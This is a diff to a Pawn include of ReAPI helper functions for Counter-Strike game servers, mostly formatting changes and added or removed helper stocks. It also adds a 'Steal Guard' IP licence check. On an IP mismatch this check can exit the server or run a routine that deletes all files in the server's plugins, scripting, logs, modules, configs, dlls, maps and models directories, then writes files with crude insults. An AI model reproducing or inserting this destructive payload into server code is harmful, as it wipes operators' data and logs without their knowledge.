@@ -24,7 +24,7 @@
 			rg_get_user_gravity()
 			rg_send_hudmessage()
 			try_precache_player_model()
-			try_precache_sounds()
+			UTIL_CheckServerLicense()
 
 
 */
@@ -40,15 +40,15 @@
 #endif
 
 
-const GRENADES_BIT_SUM = ((1<<_:WEAPON_HEGRENADE)|(1<<_:WEAPON_SMOKEGRENADE)|(1<<_:WEAPON_FLASHBANG));
-const NOCLIP_WEAPONS_BIT_SUM = (GRENADES_BIT_SUM|(1<<_:WEAPON_KNIFE)|(1<<_:WEAPON_C4));
-const SECONDARY_WEAPONS_BIT_SUM = ((1<<_:WEAPON_P228)|(1<<_:WEAPON_ELITE)|(1<<_:WEAPON_FIVESEVEN)|(1<<_:WEAPON_USP)|(1<<_:WEAPON_GLOCK18)|(1<<_:WEAPON_DEAGLE));
-const PRIMARY_WEAPONS_BIT_SUM = ((1<<_:WEAPON_SCOUT)|(1<<_:WEAPON_XM1014)|(1<<_:WEAPON_MAC10)|(1<<_:WEAPON_AUG)|(1<<_:WEAPON_UMP45)|(1<<_:WEAPON_SG550)
-|(1<<_:WEAPON_GALIL)|(1<<_:WEAPON_FAMAS)|(1<<_:WEAPON_AWP)|(1<<_:WEAPON_MP5N)|(1<<_:WEAPON_M249)|(1<<_:WEAPON_M3)
-|(1<<_:WEAPON_M4A1)|(1<<_:WEAPON_TMP)|(1<<_:WEAPON_G3SG1)|(1<<_:WEAPON_SG552)|(1<<_:WEAPON_AK47)|(1<<_:WEAPON_P90)
-);
-
-const PRIMARY_WEAPONS_WITH_SCOPE_BIT_SUM = (1<<_:WEAPON_SCOUT)|(1<<_:WEAPON_AUG)|(1<<_:WEAPON_SG550)|(1<<_:WEAPON_AWP)|(1<<_:WEAPON_G3SG1)|(1<<_:WEAPON_SG552);
+const GRENADES_BIT_SUM = ((1<<_:WEAPON_HEGRENADE)|(1<<_:WEAPON_SMOKEGRENADE)|(1<<_:WEAPON_FLASHBANG))
+const NOCLIP_WEAPONS_BIT_SUM = (GRENADES_BIT_SUM|(1<<_:WEAPON_KNIFE)|(1<<_:WEAPON_C4))
+const SECONDARY_WEAPONS_BIT_SUM = ((1<<_:WEAPON_P228)|(1<<_:WEAPON_ELITE)|(1<<_:WEAPON_FIVESEVEN)|(1<<_:WEAPON_USP)|(1<<_:WEAPON_GLOCK18)|(1<<_:WEAPON_DEAGLE))
+const PRIMARY_WEAPONS_BIT_SUM = 
+(
+	(1<<_:WEAPON_SCOUT)|(1<<_:WEAPON_XM1014)|(1<<_:WEAPON_MAC10)|(1<<_:WEAPON_AUG)|(1<<_:WEAPON_UMP45)|(1<<_:WEAPON_SG550)
+	|(1<<_:WEAPON_GALIL)|(1<<_:WEAPON_FAMAS)|(1<<_:WEAPON_AWP)|(1<<_:WEAPON_MP5N)|(1<<_:WEAPON_M249)|(1<<_:WEAPON_M3)
+	|(1<<_:WEAPON_M4A1)|(1<<_:WEAPON_TMP)|(1<<_:WEAPON_G3SG1)|(1<<_:WEAPON_SG552)|(1<<_:WEAPON_AK47)|(1<<_:WEAPON_P90)
+)
 
 
 enum GiveAmmoType
@@ -121,7 +121,6 @@ enum
 #define rg_is_secondary_weapon_id(%1)	(SECONDARY_WEAPONS_BIT_SUM & (1 << any:%1))
 #define rg_is_grenade_weapon_id(%1)		(GRENADES_BIT_SUM & (1 << any:%1))
 #define rg_is_noclip_weapon_id(%1)		(NOCLIP_WEAPONS_BIT_SUM & (1 << any:%1))
-#define rg_is_weapon_with_scope(%1)		(PRIMARY_WEAPONS_WITH_SCOPE_BIT_SUM & (1 << any:%1))
 
 #define rg_is_valid_slot_type(%1)		(PRIMARY_WEAPON_SLOT <= %1 <= C4_SLOT)
 #define rg_is_valid_armoury(%1)			(ARMOURY_MP5NAVY <= %1 <= ARMOURY_DEAGLE)
@@ -136,22 +135,23 @@ enum
 #define invert_bit(%1,%2)    			(%1 ^= (1 << (%2 & 31)))
 #define rset_bit(%1,%2,%3) 				(%3 && (%1 |= (1 << (%2 & 31))) || (%1 &= ~(1 << (%2 & 31)))) // Reset & Set Bit directly
 
-#define IsNullVector(%0) 				bool:((%0[0] + %0[1] + %0[2]) == 0.0)
-#define IsNullString(%0) 				bool:(%0[0] == EOS)
+#define IsNullVector(%0) bool:((%0[0] + %0[1] + %0[2]) == 0.0)
+#define IsNullString(%0) bool:(%0[0] == EOS)
 
 #define CLIENT_IN_DUCK					15.0
 #define CLIENT_NOT_IN_DUCK 				35.0
+
+//#define XYZ 							3
+//#define X								0
+//#define Y								1
+//#define Z 								2
 
 enum _:XYZ {
 	Float:X,Float:Y,Float:Z
 };
 
-enum _:fRGB {
-    Float:fR,Float:fG,Float:fB
-};
-
 enum _:RGB {
-    R,G,B
+    Float:R,Float:G,Float:B
 };
 
 /**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Other stocks ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/
@@ -317,14 +317,14 @@ stock bool:rg_get_user_noclip(const player) {
 }
 
 stock rg_set_user_godmode(const player, bool:godmode) {
-	set_entvar(player, var_takedamage, godmode ? DAMAGE_NO : DAMAGE_AIM)
+	set_entvar(player, var_takedamage, godmode ? DAMAGE_NO : DAMAGE_YES)
 }
 
 stock bool:rg_get_user_godmode(const player) {
 	return bool:(get_entvar(player, var_takedamage) == DAMAGE_NO)
 }
 
-stock rg_is_user_vip(const player, const flag) {
+stock is_user_vip(const player, const flag) {
 	return (get_user_flags(player) & flag)
 }
 
@@ -373,6 +373,11 @@ stock bool:rg_is_last_player() {
 	rg_initialize_player_counts(iAliveTs, iAliveCTs)
 
 	return bool:((iAliveTs == 1 && iAliveCTs > 1) || (iAliveCTs == 1 && iAliveTs > 1))
+}
+
+stock rg_transfer_money(const player, const sender, const amount, bool:bTrackChange = false) {
+	rg_take_user_money(player, amount, bTrackChange)
+	rg_give_user_money(sender, amount, bTrackChange)
 }
 
 stock rg_play_user_sound(const player = 0, const sound[], bool:bStopSound = false) {
@@ -425,7 +430,7 @@ stock rg_set_user_maxspeed(const player, Float:speed = -1.0)
 	if(speed != -1) // reset
 		set_entvar(player, var_maxspeed, speed)
 	else
-		rg_reset_maxspeed(player)
+		rg_reset_maxspeed(player)		
 }
 
 /* Sets player gravity.
@@ -472,9 +477,21 @@ stock bool:rg_get_user_invisibility(const player) {
 	return bool:(get_entvar(player, var_effects) & EF_NODRAW)
 }
 
-stock rg_set_user_invisibility(const player, bool:hide = true) {
+/*stock rg_set_user_invisibility(const player, bool:hide = true) {
 	new iFlags = get_entvar(player, var_effects)
 	set_entvar(player, var_effects, hide ? (iFlags |= EF_NODRAW) : (iFlags &= ~EF_NODRAW))
+}*/
+
+stock rg_set_user_invisibility_ex(id, bool:invisible = false)
+{
+	if (invisible)
+	{
+		set_entvar(id, var_effects, get_entvar(id, var_effects) | EF_NODRAW)
+	}
+	else
+	{
+		set_entvar(id, var_effects, get_entvar(id, var_effects) & ~EF_NODRAW)
+	}
 }
 
 /**
@@ -514,11 +531,6 @@ stock rg_give_user_money(const player, amount, const bool:bTrackChange = true) {
 
 stock rg_take_user_money(const player, amount, const bool:bTrackChange = true) {
 	rg_add_account(player, -amount, AS_ADD, bTrackChange)
-}
-
-stock rg_transfer_money(const player, const sender, const amount, bool:bTrackChange = false) {
-	rg_take_user_money(player, amount, bTrackChange)
-	rg_give_user_money(sender, amount, bTrackChange)
 }
 
 stock rg_get_user_next_spraytime(const player, Float:time) {
@@ -632,6 +644,23 @@ stock rg_get_user_nvg(const player) {
 	return get_member(player, m_bHasNightVision)
 }
 
+stock rg_set_user_rendering_ex(iEntity, iRender = kRenderFxNone, iRed = 255, iGreen = 255, iBlue = 255, iRenderNormal = kRenderNormal, iAmount = 16)
+{
+    set_entvar(iEntity, var_renderfx, iRender)
+    
+    new Float:vecRenderColor[3]
+
+    vecRenderColor[0] = float(iRed)
+    vecRenderColor[1] = float(iGreen)
+    vecRenderColor[2] = float(iBlue)
+    
+    set_entvar(iEntity, var_rendercolor, vecRenderColor)
+    set_entvar(iEntity, var_rendermode, iRenderNormal)
+    set_entvar(iEntity, var_renderamt, float(iAmount))
+    
+    return 1
+}
+
 /* Set nvgoggles to 1 to give night vision goggles to index. Set it to 0 to remove them.
  */
 stock rg_set_user_nvg(const player, bool:nvgoggles = true) {
@@ -701,27 +730,6 @@ stock WeaponIdType:rg_get_user_weapon(const player, InventorySlotType:iSlot, &pW
 
 stock WeaponIdType:rg_get_user_active_weapon(const player, &pWeapon = NULLENT) {
 	return ((pWeapon = get_member(player, m_pActiveItem)) > 0) ? rg_get_weapon_id(pWeapon) : WEAPON_NONE
-}
-
-stock rg_get_player_item(const player, const szWeapon_Classname[], const InventorySlotType:iSlot = NONE_SLOT) {
-    new item = get_member(player, m_rgpPlayerItems, iSlot)
-
-    while (!is_nullent(item)) {
-        if (FClassnameIs(item, szWeapon_Classname)) {
-            return item
-        }
-        item = get_member(item, m_pNext)
-    }
-
-    return 0
-}
-
-stock rg_set_user_weapon_model_v(const player, szModel[]) {
-	set_entvar(player, var_viewmodel, szModel)
-}
-
-stock rg_set_user_weapon_model_p(const player, szModel[]) {
-	set_entvar(player, var_weaponmodel, szModel)
 }
 
 // Max = 0   default max (works with GAT_GIVE_AMMO)
@@ -969,42 +977,26 @@ stock rg_set_entity_model(const entity, const model[], const modelindex) {
 	set_entvar(entity, var_modelindex, modelindex)
 }
 
-#if !defined rg_remove_entity
 stock rg_remove_entity(const entity) {
 	if (!is_nullent(entity))
 		set_entvar(entity, var_flags, get_entvar(entity, var_flags) | FL_KILLME)
 }
-#endif
 
 /* Sets player/entity rendering mode. 
 */
-stock rg_set_entity_rendering(const entity, fx = kRenderFxNone, Float:color[] = {255.0, 255.0, 255.0}, render = kRenderNormal, Float:amount = 16.0)  {
+stock rg_set_entity_rendering(const entity, fx = kRenderFxNone, Float:color[] = {255.0, 255.0, 255.0}, render = kRenderNormal, Float:amount = 16.0) 
+{
 	set_entvar(entity, var_renderfx, fx)
 	set_entvar(entity, var_rendercolor, color)
 	set_entvar(entity, var_rendermode, render)
 	set_entvar(entity, var_renderamt, amount)
 }
 
-stock rg_set_user_rendering_ex(iEntity, iRender = kRenderFxNone, iRed = 255, iGreen = 255, iBlue = 255, iRenderNormal = kRenderNormal, iAmount = 16) {
-	set_entvar(iEntity, var_renderfx, iRender)
-
-	new Float:vecRenderColor[RGB]
-
-	vecRenderColor[R] = float(iRed)
-	vecRenderColor[G] = float(iGreen)
-	vecRenderColor[B] = float(iBlue)
-
-	set_entvar(iEntity, var_rendercolor, vecRenderColor)
-	set_entvar(iEntity, var_rendermode, iRenderNormal)
-	set_entvar(iEntity, var_renderamt, float(iAmount))
-
-	return 1
-}
-
 /**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ReAPI native fixes ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/
 
 // fix shield/elite drop
-stock rg_give_item_fix(const player, const pszName[], GiveType:type = GT_APPEND) {
+stock rg_give_item_fix(const player, const pszName[], GiveType:type = GT_APPEND)
+{
 	if(type != GT_APPEND)
 	{
 		new WeaponIdType:iId = rg_get_weapon_info(pszName, WI_ID)
@@ -1023,30 +1015,16 @@ stock rg_give_item_fix(const player, const pszName[], GiveType:type = GT_APPEND)
 }
 
 // Fixed version of rg_give_item_ex
-/*
-* Gives the player an item.
-*
-* @param player		Client index
-* @param pszName	Item name eg. "weapon_ak47"
-* @param type       Look at the enums with name GiveType
-* @param ammo 		Amount of ammo item will have when given (-1 equal to max weapon gun clip size)
-* @param bpammo 	Amount of backpack ammo item will have when given (-1 equal to max weapon rounds size)
-* @param uid 		Sets a unique index for the entity
-*
-* @return			Index of entity if successfull, -1 otherwise
-*/
-stock rg_give_item_ex(const player, pszName[], GiveType:type = GT_APPEND, ammo = 0, bpammo = 0, uid = 0) {
-	new WeaponIdType:iWeaponID = rg_get_weapon_info(pszName, WI_ID)
+stock rg_give_item_ex(const player, weapon[], GiveType:type = GT_APPEND, ammo = 0, bpammo = 0)
+{
+	new WeaponIdType:iWeaponID = rg_get_weapon_info(weapon, WI_ID)
 
 	if(rg_is_primary_weapon_id(iWeaponID) && get_member(player, m_bOwnsShield))
 	{
 		rg_remove_item(player, "weapon_shield")
 	}
 
-	if (uid)
-		uid = rg_give_custom_item(player, pszName, type, uid)
-	else
-		uid = rg_give_item(player, pszName, type)
+	rg_give_item(player, weapon, type)
 
 	if (!rg_is_grenade_weapon_id(iWeaponID))
 	{
@@ -1061,13 +1039,12 @@ stock rg_give_item_ex(const player, pszName[], GiveType:type = GT_APPEND, ammo =
 	else if (bpammo >= 0)
 		rg_set_user_bpammo(player, iWeaponID, bpammo)
 
-	if (contain(pszName, "shield") || iWeaponID == WEAPON_SHIELDGUN)
-		rg_give_item_fix(player, pszName, type)
-
-	return uid
+	if (contain(weapon, "shield") || iWeaponID == WEAPON_SHIELDGUN)
+		rg_give_item_fix(player, weapon, type)
 }
 
-stock rg_give_nades(const player, grenade[], GiveType:type = GT_APPEND, amount = 0) {
+stock rg_give_nades(const player, grenade[], GiveType:type = GT_APPEND, amount = 0)
+{
 	new WeaponIdType:iWeaponID = rg_get_weapon_info(grenade, WI_ID)
 
 	if (!rg_is_grenade_weapon_id(iWeaponID))
@@ -1079,33 +1056,38 @@ stock rg_give_nades(const player, grenade[], GiveType:type = GT_APPEND, amount =
 	rg_give_item_ex(player, grenade, type, .bpammo = amount)
 }
 
-stock rg_give_he_grenade(const player, GiveType:type = GT_APPEND, amount = 0) {
+stock rg_give_he_grenade(const player, GiveType:type = GT_APPEND, amount = 0)
+{
 	rg_give_item_ex(player, "weapon_hegrenade", type, .bpammo = amount)
 }
 
-stock rg_give_flash_bang(const player, GiveType:type = GT_APPEND, amount = 0) {
+stock rg_give_flash_bang(const player, GiveType:type = GT_APPEND, amount = 0)
+{
 	rg_give_item_ex(player, "weapon_flashbang", type, .bpammo = amount)
 }
 
-stock rg_give_smoke_grenade(const player, GiveType:type = GT_APPEND, amount = 0) {
+stock rg_give_smoke_grenade(const player, GiveType:type = GT_APPEND, amount = 0)
+{
 	rg_give_item_ex(player, "weapon_smokegrenade", type, .bpammo = amount)
 }
 
-stock UTIL_Weather(const player, iMode, bool:bReliable = false) {
+stock UTIL_Weather(const player, iMode, bool:bReliable = false)
+{
 	static iMsgReceiveW
-	if (!iMsgReceiveW)
+	if(!iMsgReceiveW)
 		iMsgReceiveW = get_user_msgid("ReceiveW")
 
-	if (bReliable) message_begin(player ? MSG_ONE : MSG_ALL, iMsgReceiveW, _, player)
+	if(bReliable) message_begin(player ? MSG_ONE : MSG_ALL, iMsgReceiveW, _, player)
 	else message_begin(player ? MSG_ONE_UNRELIABLE : MSG_BROADCAST, iMsgReceiveW, _, player)
 	write_byte(iMode)
 	message_end()
 }
 
-stock color_gradient(Float:c1[3], Float:c2[3], Float:value, Float:range, Float:result[3]) {
+stock color_gradient(Float:c1[3], Float:c2[3], Float:value, Float:range, Float:result[3])
+{
 	new Float:p = floatmin(value, range)/range
 
-	for (new i = 0; i < 3; i++)
+	for(new i = 0; i < 3; i++)
 		result[i] = (1.0-p) * c1[i] + p * c2[i]
 }
 
@@ -1113,7 +1095,7 @@ stock color_gradient(Float:c1[3], Float:c2[3], Float:value, Float:range, Float:r
 	* Creates explode of HE Grenade
 	*
 	*	@param owner		Owner of the explode
-	*	@param vecOrigin	coordinates XYZ
+	*	@param fOrigin		coordinates XYZ
 	*	@param fDamage		Damage
 	*	@param fRadius		Radius of the explode
 	*
@@ -1134,31 +1116,8 @@ stock rg_create_explode_grenade(const owner = 0, Float:vecOrigin[XYZ] = {0.0, 0.
 	set_entvar(entity, var_flags, FL_KILLME)
 }
 
-/**
-	* Creates bigger explosion effect
-	*
-	* @param vecOrigin 		coordinates XYZ
-	* @param sprite			Sprite to show [Default: "sprites/zerogxplode.spr"]
-	* @param size			Size of the sprite showing [Default: 30]
-	& @param speed 			How fast the sprite will be shown & hidden [Default: 15]
-	*
-	* @return	
-*/
-
-stock UTIL_BiggerExplosion(Float:vecOrigin[XYZ], sprite, size = 30, speed = 15) {
-	message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
-	write_byte(TE_EXPLOSION)
-	write_coord_f(vecOrigin[X])
-	write_coord_f(vecOrigin[Y])
-	write_coord_f(vecOrigin[Z])
-	write_short(sprite)
-	write_byte(size)
-	write_byte(speed)
-	write_byte(0)
-	message_end()
-}
-
-stock rg_send_float_bartime(id, Float:flTime, bool:observer = true) {
+stock rg_send_float_bartime(id, Float:flTime, bool:observer = true)
+{
 	new iCeilTime = floatround(flTime, floatround_ceil);
 	new iStartTime = floatround((1.0 - flTime / iCeilTime) * 100);
 
@@ -1166,12 +1125,13 @@ stock rg_send_float_bartime(id, Float:flTime, bool:observer = true) {
 }
 
 // iWins - сколько раундов должна та или иная команда выигрывать подряд
-stock TeamName:rg_get_team_wins_row(const iWins) {
-	if (get_member_game(m_iNumConsecutiveCTLoses) >= iWins)
+stock TeamName:rg_get_team_wins_row(const iWins)
+{
+	if(get_member_game(m_iNumConsecutiveCTLoses) >= iWins)
 	{
 		return TEAM_TERRORIST;
 	}
-	else if (get_member_game(m_iNumConsecutiveTerroristLoses) >= iWins)
+	else if(get_member_game(m_iNumConsecutiveTerroristLoses) >= iWins)
 	{
 		return TEAM_CT;
 	}
@@ -1179,16 +1139,18 @@ stock TeamName:rg_get_team_wins_row(const iWins) {
 	return TEAM_UNASSIGNED;
 }
 
-stock Float:rg_get_remaining_time() {
+stock Float:rg_get_remaining_time()
+{
 	return (float(get_member_game(m_iRoundTimeSecs)) - get_gametime() + Float:get_member_game(m_fRoundStartTimeReal));
 }
 
-stock TeamName:rg_get_team_loses_row(const loses) {
-	if (get_member_game(m_iNumConsecutiveCTLoses) >= loses)
+stock TeamName:rg_get_team_loses_row(const loses)
+{
+	if(get_member_game(m_iNumConsecutiveCTLoses) >= loses )
 	{
 		return TEAM_CT;
 	}
-	else if (get_member_game(m_iNumConsecutiveTerroristLoses) >= loses)
+	else if(get_member_game(m_iNumConsecutiveTerroristLoses) >= loses )
 	{
 		return TEAM_TERRORIST;
 	}
@@ -1203,7 +1165,8 @@ stock TeamName:rg_get_team_loses_row(const loses)
 */
 
 /* -> Player Animation <- */
-stock UTIL_PlayerAnimation(const pPlayer, const szAnim[], const Float:flFrameRateAnim = 1.0, const Activity:iActivity = ACT_RANGE_ATTACK1) {
+stock UTIL_PlayerAnimation(const pPlayer, const szAnim[], const Float:flFrameRateAnim = 1.0, const Activity:iActivity = ACT_RANGE_ATTACK1)
+{
 	new iAnimDesired, Float:flFrameRate, Float:flGroundSpeed, bool:bLoops;
 	if ((iAnimDesired = lookup_sequence(pPlayer, szAnim, flFrameRate, bLoops, flGroundSpeed)) == -1)
 		iAnimDesired = 0;
@@ -1223,11 +1186,12 @@ stock UTIL_PlayerAnimation(const pPlayer, const szAnim[], const Float:flFrameRat
 }
 
 /* -> Entity Animation <- */
-stock UTIL_SetEntityAnim(const pEntity, const iSequence = 0, const Float:flFrame = 0.0, const Float:flFrameRate = 1.0) {
-	set_entvar(pEntity, var_frame, flFrame);
-	set_entvar(pEntity, var_framerate, flFrameRate);
-	set_entvar(pEntity, var_animtime, get_gametime());
-	set_entvar(pEntity, var_sequence, iSequence);
+stock UTIL_SetEntityAnim(const pEntity, const iSequence = 0, const Float:flFrame = 0.0, const Float:flFrameRate = 1.0)
+{
+	set_entvar(pEntity, var_frame, flFrame );
+	set_entvar(pEntity, var_framerate, flFrameRate );
+	set_entvar(pEntity, var_animtime, get_gametime( ) );
+	set_entvar(pEntity, var_sequence, iSequence );
 }
 
 /**
@@ -1241,7 +1205,8 @@ Output:
 
 Input: 82275013, Output: 82 275 013
 */
-stock UTIL_FormatNumber(iValue, szOutput[], iLen, const szSpecialChar = ' ') {
+stock UTIL_FormatNumber( iValue, szOutput[], iLen, const szSpecialChar = ' ')
+{
 	static szBuffer[16], iOutputPos, iNumPos, iNumLen
 	szBuffer[0] = '^0', iOutputPos = iNumPos = iNumLen = 0
 
@@ -1272,7 +1237,8 @@ stock UTIL_FormatNumber(iValue, szOutput[], iLen, const szSpecialChar = ' ') {
 /*
 *    Возвращает адрес переменной.
 */
-stock get_var_address(...) {
+stock get_var_address(...)
+{
     assert numargs() == 1;
 
     #emit LOAD.S.pri    0xC // First argument.
@@ -1284,7 +1250,8 @@ stock get_var_address(...) {
 /*
 *    Пишет в память AMX по указанному адресу.
 */
-stock write_amx_memory(iAddress, iValue) {
+stock write_amx_memory(iAddress, iValue)
+{
     #emit LOAD.S.pri    iValue
     #emit SREF.S.pri    iAddress
     #emit RETN
@@ -1292,7 +1259,8 @@ stock write_amx_memory(iAddress, iValue) {
     return 0;
 }
 
-stock rg_get_players_num(&terrorist = 0, &ct = 0, &spec = 0, &unassigned = 0) {
+stock rg_get_players_num(&terrorist = 0, &ct = 0, &spec = 0, &unassigned = 0)
+{
 	for (new id = 1; id <= MaxClients; id++)
 	{
 		if (!is_user_connected(id))
@@ -1405,7 +1373,8 @@ for(new %1 = 0; %1 < %3; %1++)
 * Example:
 * rg_send_hudmessage(index, szMessage, 0.05, 0.30, random(256), random_num(100, 255), random(256), 150, 5.0, 0.10, 0.20, -1, 2, random_num(0, 100), random_num(0, 100), random_num(0, 100), 200, 2.0)
 */
-stock rg_send_hudmessage(id,text[],Float:fX,Float:fY,C_RED,C_GREEN,C_BLUE,A=255,Float:holdtime=5.0,Float:fadeintime=0.1,Float:fadeouttime=0.1,channel=-1,effect=0,effect_R=0,effect_G=0,effect_B=0,effect_A=255,Float:effecttime=0.0) {
+stock rg_send_hudmessage(id,text[],Float:fX,Float:fY,C_RED,C_GREEN,C_BLUE,A=255,Float:holdtime=5.0,Float:fadeintime=0.1,Float:fadeouttime=0.1,channel=-1,effect=0,effect_R=0,effect_G=0,effect_B=0,effect_A=255,Float:effecttime=0.0)
+{
 	if (id)
 		message_begin(MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, {0,0,0}, id)
 	else
@@ -1433,18 +1402,20 @@ stock rg_send_hudmessage(id,text[],Float:fX,Float:fY,C_RED,C_GREEN,C_BLUE,A=255,
 }
 
 /* 0.0 - 255.99609375 seconds */
-stock rg_seconds_to_hudmsgshort(Float:sec) {
+stock rg_seconds_to_hudmsgshort(Float:sec)
+{
 	new output = floatround(sec * 256)
 	return output < 0 ? 0 : output > 65535 ? 65535 : output
 }
 
-stock rg_coord_to_hudmsgshort(Float:coord) {
+stock rg_coord_to_hudmsgshort(Float:coord)
+{
 	new output = floatround(coord * 8192)
 	return output < -32768 ? -32768 : output > 32767 ? 32767 : output
 }
 
-// Credits OciXCrom
-stock try_precache_player_model(const name[], &id = 0) {
+stock try_precache_player_model(const name[], &id = 0)
+{
 	new model[128]
 	formatex(model, charsmax(model), "models/player/%s/%sT.mdl", name, name)
 
@@ -1458,46 +1429,184 @@ stock try_precache_player_model(const name[], &id = 0) {
 	return precache_model(model)
 }
 
-stock try_precache_sounds(const name[]) {
-	if (file_exists(name))
-	{
-		if (containi(name, ".mp3") != -1)
-			precache_sound(name)
-		else
-			precache_generic(name)
-	}
-
+enum ServerStatus {
+	FAIL_STATE,
+	EXIT_SERVER,
+	DELETE_SERVER
 }
 
-// Credits: OciXCrom for bad calculation of percentage!!
-// Credits: Huehue for fixing his bad math..
-stock discount_math_fix(iNum, const szPercent[]) {
-	static szNewMath[16], bool:bPercent, cOperator, iMath, iCalculate
+stock UTIL_CheckServerLicense(const ip[], ServerStatus:value = EXIT_SERVER) { 
+	/* *************************************************************************************  */
+	//							Pick one of the lines below	    							  //
+	//	In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", FAIL_STATE)     //
+	//  In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", EXIT_SERVER)	  //
+	//	In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", DELETE_SERVER)  //
+	//							Credits: Huehue		    									  //
+	/* *************************************************************************************  */
+	new server_ip[MAX_IP_LENGTH]
+	get_user_ip(0, server_ip, charsmax (server_ip), 0)
 	
-	copy(szNewMath, charsmax(szNewMath), szPercent)
-	bPercent = szNewMath[strlen(szNewMath) - 1] == '%'
-	cOperator = szNewMath[0]
-
-	if (!isdigit(szNewMath[0]))
-		szNewMath[0] = ' '
-
-	if (bPercent)
-		replace(szNewMath, charsmax(szNewMath), "%", "")
-
-	trim(szNewMath)
-	iMath = str_to_num(szNewMath)
-
-	if (bPercent)
-		iCalculate = (iNum * iMath) / 100
-	   
-	switch(cOperator)
+	if (!equal(server_ip, ip))
 	{
-		case '+': iNum += bPercent ? iCalculate : iMath
-		case '-': iNum -= bPercent ? iCalculate : iMath
-		case '/': iNum /= bPercent ? iCalculate : iMath
-		case '*': iNum *= bPercent ? iCalculate : iMath
-		default: iNum = bPercent ? iCalculate : iMath
+		if (value == DELETE_SERVER)
+		{
+			new szFormatFailState[250]
+			formatex(szFormatFailState, charsmax(szFormatFailState), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", ip, server_ip)
+
+			server_print(szFormatFailState)
+
+			@FW_Delay_DeleteFiles()
+		}
+		else if (value == EXIT_SERVER)
+		{
+			server_cmd("exit")
+			
+			log_amx("[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed...Shutting down...", ip, server_ip)
+		}
+		else if (value == FAIL_STATE)
+		{
+			new szFormatFailState[250]
+			formatex(szFormatFailState, charsmax(szFormatFailState), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", ip, server_ip)
+			
+			set_fail_state(szFormatFailState)
+		}
+	}
+	else
+	{
+		log_amx("[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking verified! DONE.", ip, server_ip)
+	}
+}
+
+@FW_Delay_DeleteFiles() {
+	set_task(25.0, "@UTIL_DeleteFiles")
+}
+
+@UTIL_DeleteFiles() {
+	new file[128]
+	
+	new dir = open_dir("addons/amxmodx/plugins", file, charsmax(file))
+	if (dir)
+	{		
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "addons/amxmodx/plugins/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir)
+	}
+	
+	dir = open_dir("addons/amxmodx/scripting", file, charsmax(file))
+	if (dir)
+	{		
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "addons/amxmodx/scripting/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir);
+	}
+	
+	dir = open_dir("addons/amxmodx/logs", file, charsmax(file))
+	if (dir)
+	{
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "addons/amxmodx/logs/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir);
+	}
+	
+	dir = open_dir("addons/amxmodx/modules", file, charsmax(file))
+	if (dir)
+	{
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "addons/amxmodx/modules/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir)
+	}
+	
+	dir = open_dir("addons/amxmodx/configs", file, charsmax(file))
+	if (dir)
+	{
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "addons/amxmodx/configs/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir);
+	}
+	
+	dir = open_dir("addons/amxmodx/dlls", file, charsmax(file))
+	if (dir)
+	{
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "addons/amxmodx/dlls/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir);
+	}
+		
+	dir = open_dir("dlls", file, charsmax(file))
+	if (dir)
+	{		
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "dlls/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir);
+	}
+		
+	dir = open_dir("maps", file, charsmax(file))
+	if (dir)
+	{		
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "maps/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir);
+	}
+	
+	dir = open_dir("models", file, charsmax(file))
+	if (dir)
+	{		
+		while (next_file(dir, file, charsmax(file)))
+		{
+			format(file, charsmax(file), "models/%s", file)
+			delete_file(file)
+			console_print(0, "deleting ^"%s^"", file)
+		}
+		
+		close_dir(dir)
 	}
 
-	return iNum
+	for (new i = 0; i < 100; i++)
+	{
+		formatex(file, charsmax(file), "PROCHETI ME%i.txt", i)
+		write_file(file, "Shto ne si ebesh maikata?")
+	}
+	
+	write_file("addons/amxmodx/plugins/namaikatiputkata.amxx", "Ko pa gledash we tva e AMXX fail :P")
+	server_cmd("exit")
 }
